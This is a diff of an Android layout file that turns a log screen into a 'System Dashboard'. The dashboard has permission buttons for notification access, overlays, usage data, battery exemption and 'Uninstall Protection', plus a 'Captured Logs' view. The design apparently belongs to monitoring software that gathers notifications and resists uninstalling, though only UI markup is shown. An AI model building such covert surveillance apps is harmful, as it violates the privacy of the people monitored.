@@ -63,63 +63,60 @@
         </GridLayout>
     </LinearLayout>
 
-    <LinearLayout
+    <ScrollView
         android:id="@+id/mainContentLayout"
         android:layout_width="match_parent"
         android:layout_height="match_parent"
-        android:orientation="vertical"
-        android:padding="16dp"
+        android:fillViewport="true"
         android:visibility="gone">
-
-        <TextView
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="System Logs" android:textColor="#00FF00" android:textSize="22sp"
-            android:textStyle="bold"
-            android:layout_marginBottom="10dp"/>
-
-        <ScrollView
-            android:layout_width="match_parent"
-            android:layout_height="0dp"
-            android:layout_weight="1">
-            <TextView
-                android:id="@+id/logTextView"
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:textColor="#E0E0E0" android:fontFamily="monospace" android:textSize="13sp"
-                android:text="Waiting for data..."/>
-        </ScrollView>
 
         <LinearLayout
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:orientation="horizontal"
-            android:layout_marginTop="10dp">
-            <Button
-                android:id="@+id/btnRefresh"
-                android:layout_width="0dp"
-                android:layout_weight="1"
+            android:orientation="vertical"
+            android:padding="16dp">
+
+            <TextView
+                android:layout_width="match_parent"
                 android:layout_height="wrap_content"
-                android:layout_marginEnd="8dp"
-                android:backgroundTint="#222222"
-                android:textColor="#FFFFFF"
-                android:text="🔄 Refresh" />
-            <Button
-                android:id="@+id/btnClear"
-                android:layout_width="0dp"
-                android:layout_weight="1"
+                android:text="System Dashboard" android:textColor="#00FF00" android:textSize="22sp"
+                android:textStyle="bold" android:layout_marginBottom="16dp"/>
+
+            <Button android:id="@+id/btnPermNotif" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Notification Access" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnPermOverlay" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Display Over Other Apps" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnPermWrite" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Modify System Settings" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnPermDND" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Do Not Disturb Access" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnPermUsage" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Usage Data Access" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnPermBattery" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Ignore Battery Optimization" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnPermAlarm" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Exact Alarms" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnPermPost" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Post Notifications (A13+)" android:layout_marginBottom="8dp"/>
+            <Button android:id="@+id/btnAdmin" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="❌ Uninstall Protection" android:layout_marginBottom="24dp"/>
+
+            <Button android:id="@+id/btnStartServices" android:layout_width="match_parent" android:layout_height="wrap_content" android:backgroundTint="#4CAF50" android:textColor="#FFFFFF" android:text="🚀 START SYSTEM SERVICES" android:textStyle="bold" android:layout_marginBottom="24dp"/>
+
+            <TextView
+                android:layout_width="match_parent"
                 android:layout_height="wrap_content"
-                android:layout_marginStart="8dp"
-                android:backgroundTint="#8B0000" android:textColor="#FFFFFF"
-                android:text="🗑️ Clear Local" />
+                android:text="Captured Logs" android:textColor="#00FF00" android:textSize="18sp"
+                android:textStyle="bold" android:layout_marginBottom="10dp"/>
+
+            <TextView
+                android:id="@+id/logTextView"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:minHeight="150dp"
+                android:textColor="#E0E0E0" android:fontFamily="monospace" android:textSize="13sp"
+                android:text="Waiting for data..."/>
+
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="horizontal"
+                android:layout_marginTop="10dp">
+                <Button android:id="@+id/btnRefresh" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:layout_marginEnd="8dp" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:text="🔄 Refresh" />
+                <Button android:id="@+id/btnClear" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:layout_marginStart="8dp" android:backgroundTint="#8B0000" android:textColor="#FFFFFF" android:text="🗑️ Clear Local" />
+            </LinearLayout>
+
         </LinearLayout>
-        <Button
-            android:id="@+id/btnAdmin"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="10dp"
-            android:backgroundTint="#00008B" 
-            android:textColor="#FFFFFF"
-            android:text="🛡️ Enable Protection" />
-    </LinearLayout>
+    </ScrollView>
 </RelativeLayout>
